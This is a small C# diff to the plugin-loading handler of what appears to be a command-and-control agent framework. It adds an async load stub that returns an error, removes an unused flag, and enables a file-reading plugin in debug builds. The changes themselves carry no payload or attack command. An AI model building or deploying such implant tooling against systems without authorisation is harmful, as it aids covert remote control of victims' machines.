@@ -12,7 +12,6 @@ namespace Athena.Commands
     public class AssemblyHandler
     {
         private ConcurrentDictionary<string, IPlugin> loadedPlugins { get; set; }
-        public bool assemblyIsRunning = false;
         public AssemblyHandler()
         {
             this.loadedPlugins = new ConcurrentDictionary<string, IPlugin>();
@@ -72,6 +71,16 @@ namespace Athena.Commands
             return new LoadCommandResponseResult
             {
                 task_id = job.task.id,
+                completed = "true",
+                user_output = "Can't load!",
+                status = "error"
+            }.ToJson();
+        }
+        public async Task<string> LoadCommandAsync(string task_id, byte[] buf)
+        {
+            return new LoadCommandResponseResult
+            {
+                task_id = task_id,
                 completed = "true",
                 user_output = "Can't load!",
                 status = "error"
@@ -137,7 +146,7 @@ namespace Athena.Commands
                     plugin = new Arp();
                     break;
 #endif
-#if CAT
+#if CAT || DEBUG
                 case "cat":
                     plugin = new Cat();
                     break;
